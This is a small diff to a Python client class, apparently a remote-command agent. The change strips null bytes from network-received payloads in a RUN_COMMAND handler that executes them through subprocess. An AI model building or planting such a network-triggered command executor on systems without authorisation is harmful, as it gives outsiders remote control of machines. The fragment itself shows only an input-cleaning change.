@@ -316,7 +316,7 @@ class Client:
                 self.send_response(src_ip, CommandType.ERROR, str(e).encode())
 
         elif command_type == CommandType.RUN_COMMAND:
-            cmd = payload.decode('utf-8', errors='ignore').strip()
+            cmd = payload.decode('utf-8', errors='ignore').replace('\x00', '').strip()
             print(f"[*] Processing RUN_COMMAND: {cmd}")
             try:
                 result = subprocess.run(
